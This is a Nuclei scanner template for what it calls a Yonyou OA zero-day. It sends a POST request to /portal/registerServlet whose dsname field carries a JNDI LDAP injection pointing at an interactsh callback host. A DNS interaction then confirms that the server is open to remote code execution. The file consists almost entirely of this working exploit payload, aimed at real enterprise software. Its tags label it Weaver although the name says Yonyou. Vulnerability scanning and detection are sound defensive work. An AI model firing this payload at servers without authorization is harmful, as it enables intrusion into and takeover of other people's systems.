id: yongyouOA-registerServlet-JNDI-0day
info:
  name: 用友0day
  author: cnaq
  severity: critical
  description: 用友0day
  reference:
    - 
  tags: weaver,rce

requests:
  - raw:
      - |
        POST /portal/registerServlet HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        Origin: null
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
        like Gecko) Chrome/84.0.4147.89 Safari/537.36
        Accept:
        text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;
        q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,zh-CN;q=0.6
        Cookie: JSESSIONID=F93067EB562380A53F145E7724A1B127.server
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 41

        type=1&dsname=ldap://{{interactsh-url}}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol  # Confirms the DNS Interaction
        words:
          - "dns"